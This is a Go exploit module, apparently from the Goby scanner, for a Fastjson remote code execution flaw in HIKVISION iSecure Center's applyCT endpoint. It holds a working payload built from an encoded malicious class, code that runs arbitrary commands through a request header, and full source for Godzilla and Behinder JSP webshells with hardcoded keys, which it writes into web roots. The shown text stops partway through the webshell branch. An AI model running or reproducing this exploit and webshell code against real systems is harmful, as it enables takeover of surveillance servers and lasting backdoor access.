package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "HIKVISION iSecure Center applyCT remote code execution vulnerability",
    "Description": "<p>HIKVISION iSecure Center is a software platform that can centrally manage accessed video surveillance points and realize unified deployment, unified configuration, unified management and unified scheduling.</p><p>HIKVISION iSecure Center has a Fastjson remote command execution vulnerability. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "HIKVISION-General-SMP",
    "Homepage": "https://www.hikvision.com/cn/",
    "DisclosureDate": "2022-12-01",
    "Author": "heiyeleng",
    "FofaQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\"",
    "GobyQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\"",
    "Level": "3",
    "Impact": "<p>HIKVISION iSecure Center has a Fastjson remote command execution vulnerability. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has provided a vulnerability patching solution. Please pay attention to the manufacturer's homepage for timely updates: <a href=\"https://www.hikvision.com/cn/\">https://www.hikvision.com/cn/</a>.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell,reverse",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\"); %>",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2021-33192"
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "HIKVISION iSecure Center applyCT 远程代码执行漏洞",
            "Product": "HIKVISION-综合安防管理平台",
            "Description": "<p>HIKVISION iSecure Center 是一款可以对接入的视频监控点集中管理、实现统一部署、统一配置、统一管理和统一调度等功能于一体的软件平台。<br></p><p>HIKVISION iSecure Center 存在 Fastjson 远程命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>厂商已提供漏洞修补方案，请关注厂商主页及时更新：<a href=\"https://www.hikvision.com/cn/\" target=\"_blank\">https://www.hikvision.com/cn/</a>。<br></p>",
            "Impact": "<p>HIKVISION iSecure Center 存在 Fastjson 远程命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "HIKVISION iSecure Center applyCT remote code execution vulnerability",
            "Product": "HIKVISION-General-SMP",
            "Description": "<p>HIKVISION iSecure Center is a software platform that can centrally manage accessed video surveillance points and realize unified deployment, unified configuration, unified management and unified scheduling.</p><p>HIKVISION iSecure Center has a Fastjson remote command execution vulnerability. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has provided a vulnerability patching solution. Please pay attention to the manufacturer's homepage for timely updates: <a href=\"https://www.hikvision.com/cn/\" target=\"_blank\">https://www.hikvision.com/cn/</a>.<br></p>",
            "Impact": "<p>HIKVISION iSecure Center has a Fastjson remote command execution vulnerability. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-11-28",
    "PocId": "10755"
}`

	sendPayloadFlag4EisQu := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewPostRequestConfig("/bic/ssoService/v1/applyCT")
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "application/json")
		payloadRequestConfig.Header.Store("Cmd", cmd)
		// A4
		payloadRequestConfig.Data = `{"CTGT": { "xxx": {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource", "driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"}, "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dY$J$7cT$f5$9d$ff$fe$s$93y$_$93$97$90$3c$I8$80$Y$Q0w8$a3L$A$n$e10$98$E$q$U$8c$88$3aL$5e$92$81$c9$bca$e6$N$Q$V$a9$d6$ab$d6$a3u$b7$ed$a2$5b$b5$b5kj$b5mpu$88$a2$88$ad$ab$b6$db$eda$ef$ae$bd$bb$3d$b6$d6$b6$bb$edv$5bk$e9$f7$ff$de$e4$82$c1$9a$e4$f3$3f$7e$e7$ffw$fe$ff$P$be$f0$d7gN$AX$y$f7$E1$HCA$b4$e2$TjxTm$3f$a9$e3$b1$mf$e3$f1$m$3e$85O$ab$e13$g$86$V$fa$a8$8e$H$83$98$8b$tt$fc$ab$8e$t5$3c$a5$p$ab$e3$98$86$R$c5$f0$b4$8egt$i$d7$f0l1$a6$e3$b9b$9c$c0$f3j8$a9$e3$F$j$9f$d5$f09E$f5$a2$86$7f$L$e2$r$bc$ac$e3$V$N$9f$d7$f1$85$m$ee$c4$bf$x$b9_$d4$f1$lE$f8$S$be$i$e4$f0$V$j_U$98W$V$d3$d7t$7c$5d$c37$d4$f2$9b$3a$be$a5$e1$db$3a$be$a3$e3$bb$K$f0$9f$g$5eS$a7$fb$5e$Q$df$c7$ab$3a$7e$a0D$fdP$c7$8f$d4$fcc$j$3fQ$f3O$95$a8$ff$d2$f13$b5$f9$b9$8e_$Uq$ffK$a5$e7$bf$d5$eaW$g$5eW2$7e$ad$867t$3c$a4$e37$3a$7e$ab$98$7e$a7$e3$7f$d4$fc$bf$g$7e$lD$3b$fe$a0$e1$ff$82$e8$c4$l$V$f0$ff$d5$eaOj$f8$b3$g$de$M$a2$R$7fQTo$v$3d$7f$d5q$w$u$Q$e1F$7c$ba$U$e8$e2$d7$a5P$93$40$Q$bb$94$dbw$89$a6$8b$ae6$7f$d1$a5H$97$a0$$$c5$ba$YA$v$91R5L$d1$a4$y$u$e5b$G$d1$_Su$99$a6$e6$K$Ox$5e$ad$a6$x$dc$M5$9c$a3KH$97$99$8ag$96$s$b3$83p$e4$5c5$98$K9G$ad$dc$e1$bc$a0T$ca$5c5$cc$L$ca$f92$9f$D$fe$5c$I$efg$Jm$97$F$8aa$ni$5d$5b$e4$CzH$aah$a9T$ebR$a3K$ad$$u$ba$d4$ebxX$97$GM$g$F$beXR$60$b6$ef$89$ec$8f4$c6$p$89$be$c6$$$t$VK$f45$L$fcI$3b$e5$I$a6N$c0$b5$r$i$ab$cfJ$R$ZX$ZK$c4$9c$d5$82$82$aa$ea$ed$a4m$b5$7b$y$c1$94$f6X$c2$ea$cc$M$ec$b6R$db$o$bb$e3$84$E$d7$l$8cZI$tf$t$d2$82$a2$b8$j$e9i$8dG$d2$5c$_$a8$3aSg$f5$E$90KFEE$5d$b1$beD$c4$c9$a4$u$ac$ea$9d$f0$ac$acYM$b6$c2d$ca$3e8$uX$f8wX$c6$ac$z$3c$90$8a9$d4qQ$k$86w$u$o$Y$8d$5b$91$d4$96H$w2$40$8fX$H$ad$a8$40KY$fb$adT$9a$82$a7$e7$R$dc$a6$7cW$90$ca$q$e8$d0$k$x$ea$fa0$l$5d$f5$ce$W$8a$ef$b23$a9$a8$b5$n$a6$fc$aa$ad$5d$d6$a0$c8$M$7c$A$f7$g$b2H$W$h$b2D$96$g$b2L$96$T$eb$f4$a7$acHO$da$90$s$b9P$93$8b$MY$naC$9ae$r$e3$b9s$82$fcm$$$5d$b3$n$abd$b5$n$X$cb$g$k$bc$dfq$98$S$B$t$92$ea$b3$Y$7fs$9czk$s$91$f0$c2$gp$fac$e9$f9$8b$a8$a9$3f$92$e8$89$5b$v$c1$9cq$baN$bb$x$T$ed$df$Q$b3$e2$3dc$e17d$ad$3aY$a0$_n$ef$8e$c4i$N$D$U$b5$d2i$3b$c5d$uuy3N$y$de$d8$kK$3b$86$b4H$ab$s$eb$MY$_$h$M$d9$u$97$u$_Y$fb$E$c5$3c$d2V$x$9dd$3a$a9t$3b$z$f4$86$b4$c9$sA$d98x$f3$ee$3dV$d4$d1$e4RC$da$a5$83$d9D$feKh$b1$3ap$d9$e9n$a6$92$e8$40$8f$81$fbp$bf$n$9d$b2$99$e4i$cb$e9r$98$7diM$b6$Yr$99l5$a4K$b6$J$e6$db$a9$be$86H2$S$ed$b7$g$i$7b$m$gq$g$d4$e9$hvgz$hZ$G$j$ab$b5$3f$93$d8k$e0C$f8$b0$n$efR$c7$d7$vI$nh$acog$8b$n$db$d5A$b5$k$7b$87$97uS$c7$cf2$e6$b1$i$b4$n$R$b3$5d$99$z$99$de$5eun$ff$81T$qi$c8$O$7cXPy$9a$H$3amg$83$9dILt$fb$e5$d2$ad$c9$V$C$Y$b2S$ae$a4$d9Q$7b$60$80A$abL$d8Ne$o$T$8f$h$b2KX$c8$85$e7$ab$lC$ae$92$ab$N$3c$80$fb$d9$f7$982$d7HD0o$94$r$97$cc$95$fdv$da$a9$ec$b5S$D$R$a7$d2J$a5$ec$d4$5c$Dw$e1nCvK$d4$c0$3dx$ff$q$efzI$c6L$95$kC$y$dcK$5d$f3$d5$Ps$ab$97$c9$7c$ba$a0$7f$c6GH$b1F$fd$YxP$j$c4pe$c5$ecF$95$fbJN$af$e0$9c$89$b0$cd$Z$t$99a$a4$a8g$40$e1$fb$M$3c$8c$8fS$94$f4$h$SS$F$b2G$N$7bU$92$c7$d50$mt$aff$a7$h$S$91$BK$T$db$90$a4$K$fa$3e$e5$88$82$D$b1$84$ea$7enF$f8$ea$b9$9eqz$a6$b4dbq$e6$90$n$va$40$L$x$eb$T$95$cbH$db$Yu7$8e$bbI$f7$x$ee$a8$sL$e7$8c$ec$a7$vr$40P$3e$9e$e9$5d$d1H$oa$a549h$c8$a0$5c$ab$ce$7d$jY$ae$8c$Yr$bd$iRi$cf$83$de$40$84$iV$3e$d3$gw$c7$S$8dJ$aa$c6$ym$60$7bQ$o$df$3dZ$F$J$cbi$ec$b2$a3$7b$zG$b5$84$8f$gr$a3$dcd$c8$7bd$83$s7$hr$8b$dcj$c8mr$ab$s$b7$x$af$bc$d7$90$3b$e4$7d$86$dc$a9$c0w$v$3dws$85$87$f0Q$f6$9ft$s$d10$QKG$hZ$d6v$adoZ$b6$ce$edK$cc$3b$c3$ebP$a3i$e8$G$d8$cb$fa$96H$daj$a2$cdAV$d7$Y$f9$c2$J$r$a2$f2$87$r$db$a0P$d1$G$da$RI$N$8eq$f9$d6r$u$89fR$v$x$e1x$b9$o$98VU$7df$9bb$a3$a0$Go$b31eg$d8$a6By$e8$5c$U$89u$S$e7n$9b$a9U$f9$ee$962$ef$bc$f1H$ca$eaq$bb$95$a0$fe$ef$dc$X$v$ab7$ce$8e$d2$e8$927OJ$8dI$uZ$c4$8a_$hU$z$$$e6$b6L$7f$d5$Vn$b7w$9b$ea$a4k$c9kR$93$d4$e4$40$8c5$c9$3b$99$a3$a7$7bd$ec$d2$d1$a3v$c2$89$c4$d4$f5$3ak$a2$d0$d6$feH$aa$cb$da$97$b1$SQ$ab$b9$9a$f5_BI$5d$99$a4$95$8az$$$d1$d9xR$R$c7N$a9$x$t$t$da$cd$cb$b6$i$bcy$b4$f7O$82$ba$z$3f$ddi$jt$dc$bb$9f$82$fd$Jw3$f9$7cc$G$a8$8e$dba9$fd6$5d$b2$s$8fsw$9e$R$97$7c$ee$f6$q4$8f$96$7d$k$i$af$96Xb$bf$bd$97$9eZ$91$c7$b9$3b$df$a1$bfU$ce$e4$fa$b4$bf$ca$bdv$cb$cfx$fe$Q$b5$ad$7b$cbz$a2$f2$e4$94$b6$3f$S$cfX$9b$7b$95W$db$aa$f3$be$9d$8a$T$d6$81$b6D$da$8904$U2$n$JGM$d1$d8$S$bd$a8W$a8$if$84$e9bWC$bb$ed$5d$5e$a13$T$daCQ$7eE$5e$E$j$c4t$88$c4iYE$be$ecS$91dH$f8t$J$f2h$v$t$bd$p$e6$f4$9fF$3bZ$Q$a4$zL$t$e31$86$fd$82$bc$cf$95$bc$99$9a$8c$f0$ee$a0$h$ce$o$b4$8d$d54$R$3e$fa$dahVeS$e8$9e$e9$y$9c$c4$97$e7$e0$b9$L$c1$e3$a9$da$d9$e2$ce$bd$f1$8c$ea$9b$85$d1$b8$ad$9e$N$bac$8f$5e$f8S$e8$de$b5$bb$d3v$3c$e3X$5b$o$ca$5e$3e$d8$92$f1$88$K$cc$ba$b3$96$d3Y$cb$y$9f$d9$T$9f$Z$83i$c7$g$f0$5e1$5bR6k$d1$e1$T$b5$d8$b1$db$ed$DV$aa5$a2$O$X$88$q$93V$e2$jt$a2I7Q$f3$a4$3c$a5$e7$9c$98$ca$k$d5$90$c76$V$93R$s$HnV$af$ea$3c$e1$9aH$ba$c5$7b$a9M$d6$91$Dz$z$b9$z1v$fd$aa$mV$8f$c5b$CB$VoU$5e$84$8a$91$91I$5b$eb$acxl$40u$a5$b3d$d5$84$k$95$bb$3bs7$c2z$f5r$YU$af$f5Xi$te$P$be$ad$90$d3$ecRi0$f1$N$a1$8e$3an$c4D$8c$ca$e3X$baU$rR$cf$e8$b3m$b29ly$E$c6$e2$deC$99$z$92y$ed$cf$5dj$f9$q$aaF$d3$e6$a5x$dc$b2$92j$bbIm$8b$ac$831g$bbj$s$5e$i$3bx$d4H$9fJ$dfX$c2$83$f3$L$f5N$7e$ef$f3$f8$f0$f1$97$P0$7e$F$fa$d4$f3$8bs$R$e1$fc4$e0$fe$l$80$82$y$C$98J$e4$dd5$c7$m$p$f0eQ$d0$5e$9b$85$df$y$q$a6$a3$ce$9f$85V$c7$bd$7e$SE$fc$eb$ac$P$fbC$fe$TM$85$FM$81$8a$40E$e1$c7$7c$97$87$fc$V$81$ra$z$a4$bd$8c$c0$90$af5$a4e$R$M$eb$n$dd$y$ce$c2$b8$P$r$5c$95$b8$xb$X$u$ac$df$y$j$X$ad$Az$b8$uT$f4$C$a6$b8$q$beP$91$o$v$9b$40R$94$pQ$f0r$F$l$c2$f4p$d0$ddg1$95$7f$k$f4Lj$85$9a$e61$94$e5$Y$bc$7d$k$c1$V$a7$c1Ob$faIWM$f0i$cc$Q$84$8bC$c5O$e3$i$c1$R$d9$a9V$n$82$8c$90$a18gN$e04$94$c4$92P$89$82$cf$wx$O$b3$b387T$c2$c5$9c$y$ce$L$97z$88J$3f$R$dd$F$e6$dc$$$X$cb$dd$i$ee$e6qw$deI$cc$NO$JMQ$ae$3c$f5$81$9a$d0$94$y$ce$cfb$7e$b8$yT$aa$Y$Xx$8cO$60$a1$cbY$eaq$96$e3$95$R$5c$a0$b8w$d4$98UYT$87$cbCtH$N$z$x7k$D$9e$ae$ba$aen$bf$e2$eb$$$f4$b8$ebCE$B$97$3bTFL$81$S$d0$5d$Y$w$3b1$w$c9S$d8$e0$v$M$95O$d4$X$wr$v$86$b09$5c$5ec$$R$K$cd$90i$$$f6$8fjR$d2M$ff$a8tex$d1dqf$5eq$a5C$u$M$eb7$Hd$e8$ad$a1$a3$d0$f8$e6$7c$M$9f$86$89$_$e15$fc$A$a6$bc$e8$5b$e4$5b$8aF$5c$8cu$be$5b8o$c4nw$b6p$8b$3b$df$ee$3b$ec$ce$82$7fd$96$7f$l$Xr$ac$80$l$d3Q$8c$Z$5c$9d$83$99$Ia$nfQ$c2$b9$e4$9e$83N$9cG$eeJ$qY$_$Z$cc$c3$n$9c$8f$db1$9fu$b1$A$ffD$ca$87P$c53$d4$f2$U$d5$YF$N$5e$40$j$5eB$3dO$d4$c83$z$e1$a9$W$e1GX$8c$d7$b1$U$bf$c32$fc$J$cb$c5$8f$s$v$c2$852$D$X$c9R$ac$90$d5$IK$x$9a$e5R$ac$94$k$ac$92$3b$b0Z$ee$c1$c5r$_$d6$caG$d0$o$_b$9d$7c$R$eb$e5k$d8$e0$x$c5F$df$o$b4$d3$caK$7c$cb$d1$e6$5b$85M$be$5d$b8$d4w$Y$j$be$9bp$Z$ad$db$ec$bb$N$b3$7cw$a1$L$l$a4u$7e$da$aa$ec$e5$c7$q$KT5c$F$ab$ba$80sy$ed$I$96$Mw$b8$f5$bc$8c$e5$bb$7c$98d$8a$a1$90G$f5$iT$ea$S$ee$o$e4$w$b6$80$ab$c7$E$$$a5$e9$aaY$i$e1$9a$df$bb$i$95$e0S$c4$f99$df_$fb$S$M$b3$89$o$_$3c$82$80y$d10W$x$dak$cdp$W$cdG$d0$5cS$7b$M$x$cdUY$ac$ee$a8$3bQ$f8$m$v$$$k$ae$a9$xX$f2$U$d6$d4$d4$f9$97$8c$60$z$T$ec$v$b4$iGk7$h$ce$ba$ce$fa$y$d6$9b$h$86k$cd$8d$ae$80yg$K$b8$c4$V$40$e6$y$daH$b7$c9$a5$x$a9q$J$b3$b8tx$7c$c5$e3y$a6m$c54$8e1$94$60$P$ca$Qg$ec$H$Ym$9bQL$d2_$fb$Y$b94$3d$e5$60$D$a3$be$Z$fb$e9$cd$D$d8$8e$83t$c2$m9$ae$r$d5u$a48$84$h$f8$7b$h$O$b3$5b$deH$c9$fc$fa$cc9c$3f$5d$a7$fem$ad$e98$da$bb$a9$bd$a3$f38$3a$bb$eb$8f$b1$o$d8$j$ebF$b0$r$8b$cbB$ec$I$5b$d5$d05$84b$F$cfb$db0$cd$7d$97$KE$R$b3$abz$yW$Xr$Pv$ec$o$f6$e9$a9$ec$d2$b3$d9$a7$e7R$ebBb$ab$d9$a9k$a9u1$D$e4S_$df$b934$f2$M$3e$ce3$e8$7b$b3$v$8b$ed$e6$so$da$e8N$e3$ce$I$b8$91$7f$80$e3$83$a3$cc$f22cI$95r$81$b9c$E$97g$d1$dd$e1$86Q$3a$eb$cc$x$d8$ab$8f$60M$ad$b9$d3$5dT$d6$9aW$ba$dd$7b$c6q$ec$ea$3e$86$abHx$b5y$N$87$y$o$edl$ns$dd$d6$d5$ed7w$b3$81$d4v$85$fdCX$f5$f6$cc$d1$c9$cc$3d$8a$d9$ca1$8f$a0W9$aa$8f$O$ed$ef$a6$b3b$c7$b0$c7$dc$9bE$3c$5c$Y$e2$854p$E$c5jN$b0U$98M$e1$40$8e$ca$k$a7$ca$v$K$F$a8$e4L$OOs8$Q$K$84$b5$fa$97$a0$917$Z$d2$86$3d$e1$db$c2$811X$608$ac$8fm$f4$e7$e9$ae$f7$e3M$J$d0$ebj$9eI$d7$Fd$8a$3b$cf$94$d9j$ce9$3b$c1$ee$C$M$d1$b9$9f$60$81$3d$ca$ec$7b$8c$3d$e7qF$f0S$ec$3a$9fa$96$jE$3f$9e$c0$f5x$92$92$8e$b1$c8FH$f14$9e$c73$f8$w$8e$e3$8fx$Wo$e2$q$cb$ed$F$v$c0$b3$d4$f8$9c$e88$nSpR$a6$S6$83$eb$99$5cWr$3d$l$9f$a3V$7e$99$e7$82$da$cdS$g$d4$fe$f9$d1$a0$ba$b1$bc$PE$e6$be$ce$n$WR$aa$93$de$a5A$e9$b0$ff8$9c$ee$da$d9$c7$90$a1$e5tw$8c$k$e1d$f3$W$a7$l$f6$f3$f6$e6$ee$A$bb6w$Hy$Fr$g$bc$P$d7$u$a7$5e$fb$A$caBA$b5$ba$$$8b$eb$87N$bd$a1$$$f0$iP$h$H$ea9$60$91Z$8d$C$83Y$iRw$eb$a1i$b8a$E$efVJnd$df$d7$c3$c5C$a7$kP$bb$a4$d2t$d3$90zfd$f1$9e$jG$99$e0Ct$dc0$dd$O$ba$e8$b3c$F$e3$b9$f9$cbt$efW$d8$de_$a5$8b$bf$ce$f6$fd$N$b6$e6o$a2$F$df$c2$W$7c$h$97$e3$3b$b8$G$dfe$e9$bf$c62$ff$knb$bb$be$D$3fd$ab$fc1K$f9$tt$dbO$v$fdg$94$ffsj$f8$F$83$f2K$3c$85_1$Q$afS$d7o$a8$ed$d7t$f0$hx$F$bf$a5$d6$8f$b1$M$bd$c2$abc$e1$a9$8a$w$ab$a9y$92$5d$edI$b4dqs$W$b7$i$jK$82$a0$5b$98$bf$e7$e3$eb$PL$84$87$f1$f1$5c$80f$b3$WU$P$7d$5c$da$cd$5b$d9$9f$3b$ea$cc$db$s$3e$F$eaxi$7bwb$8d$f7$W$a8$e3_$fb$Q$fc$j$b5$_$a3$d5$bc$9d$y$e6$7bs$8f$K$c9$bd$v$3a$ea$d4$c5z$c7$q1g$95$b1$cc$7c$9f$a7v$S$7dg$fd$db$u$kv$dbL$3d$_$baF$yg$ebt8$P$e2$R$a6$f6h$y6$a0$9c$e3$5b$a4$3a$F$9d$8e$a9g$e2$$$S$c1b$5e$85$cb$99$c0$ed$a2a$9f$a8$ff$a3$d0$91$R$D$83R$8a$c3L$e8$7b$a4$M$8f0$a9$l$95r$7cR$w$u$ed_$dc$7b$e7$91$bf$B$c5t$M$99$c3$g$A$A"}}}`
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			rsp, _ := sendPayloadFlag4EisQu(u, "echo "+checkStr)
			return rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				cmd := goutils.B2S(ss.Params["cmd"])
				rsp, err := sendPayloadFlag4EisQu(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Output = err.Error()
				} else if rsp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html[:strings.Index(rsp.Utf8Html, "{\"code\":")]
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "webshell" {
				webshell := goutils.B2S(ss.Params["webshell"])
				var content string
				filename := goutils.RandomHexString(16) + ".jsp"
				if webshell == "behinder" {
					// 该密钥为连接密码 32 位 md5 值的前 16 位，默认连接密码 rebeyond
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){} %>`
				} else if webshell == "custom" {
					filename = goutils.B2S(ss.Params["filename"])
					content = goutils.B2S(ss.Params["content"])
				} else {
					expResult.Success = false
					expResult.Output = "未知的利用方式"
					return expResult
				}
				savePathMap := map[string]string{
					`webapps\ROOT\` + filename:       `/center_cas/..;/` + filename + `;.html`,
					`webapps\clusterMgr\` + filename: `/clusterMgr/` + filename + `;.html`,
				}
				for path := range savePathMap {
					if _, err := sendPayloadFlag4EisQu(expResult.HostInfo, "$$$$$"+path+":"+base64.StdEncoding.EncodeToString([]byte(content))); err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					}
					cfgCheck := httpclient.NewGetRequestConfig(savePathMap[path])
					cfgCheck.VerifyTls = false
					cfgCheck.FollowRedirect = false
					rspCheck, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgCheck)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					} else if rspCheck != nil && ((rspCheck.StatusCode != 200 && rspCheck.StatusCode != 500) || strings.Contains(rspCheck.Utf8Html, "404")) {
						continue
					}
					expResult.Success = true
					expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rspCheck.Request.URL.Path + "\n"
					if webshell == "behinder" {
